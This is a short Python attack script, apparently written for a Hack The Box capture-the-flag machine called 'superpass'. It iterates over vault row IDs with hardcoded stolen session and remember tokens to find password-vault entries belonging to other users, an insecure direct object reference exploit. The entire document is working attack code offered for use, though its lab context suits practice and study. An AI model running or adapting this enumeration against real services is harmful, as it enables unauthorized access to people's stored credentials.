#!/usr/bin/python3
# Author: Hack.You
import requests
from bs4 import BeautifulSoup

url = 'http://superpass.htb/vault/row/{}'

for i in range(101):
    if i == 100:
        print("Fuzzing Completed")
        break
    formatted = url.format(i)
    token = {'remember_token': '9|34dbc0f4fc532e4f8d8bfa81e9caa62a4adba06a3fdc712097fdd9ac1fdf46cc7df632ede082eb3379e7cc1e4dad0c9f0292ed3337b46d759ac88ac1c5c992bd'}
    session = {'session': '.eJydTkuKwzAMvYrROgyyY_mTU8x-KMWRpSaQmZY4XZXefVx6g67E0_s-4KxbaYs0mH4eYI5-4FdaKxeBAb43KU3Mdr2Y9c8cV1OYO2mOZW3m1jVfcHoOH_pOQy_fpS0wHftdOlorTICWpDrOhJ61OIskOBO65ENRiYpJcn09Kid2Kj2ZXMCR7ZjFZwyRUuTolaOrSJRsZtbZjmMdETXUOXSZ2oRMHukFHVlVzj28Rurzz_cm-3tNhuc_JdZZEg.ZB5mGw.6wRGlHhL0vaVEUGe5f7TEA4gEc4'}
    response = requests.get(formatted, cookies=token, headers=session)
    soup = BeautifulSoup(response.text, 'html.parser')
    if len(soup.get_text(strip=True)) > 0:
        print(f"Content found in URL: {formatted}")
        result = requests.get(formatted)
